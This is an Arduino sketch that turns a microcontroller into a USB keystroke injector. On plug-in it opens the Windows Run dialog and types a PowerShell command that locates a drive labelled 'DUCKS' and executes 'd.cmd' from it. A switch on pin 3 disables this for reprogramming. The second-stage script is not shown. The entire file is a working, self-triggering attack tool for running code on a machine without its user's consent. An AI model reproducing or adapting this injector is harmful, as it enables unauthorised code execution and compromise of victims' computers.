#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
  pinMode(3, INPUT_PULLUP);     //If switch is pushed, enter programming mode (AKA infinite while loop)
  if (digitalRead(3) == LOW) {
  while(1);
  }

  delay(5000);
  Keyboard.begin();  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("powershell \".((gwmi win32_volume -f \'label=\'\'DUCKS\'\'\').Name+\'d.cmd')\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  // put your main code here, to run repeatedly:

}
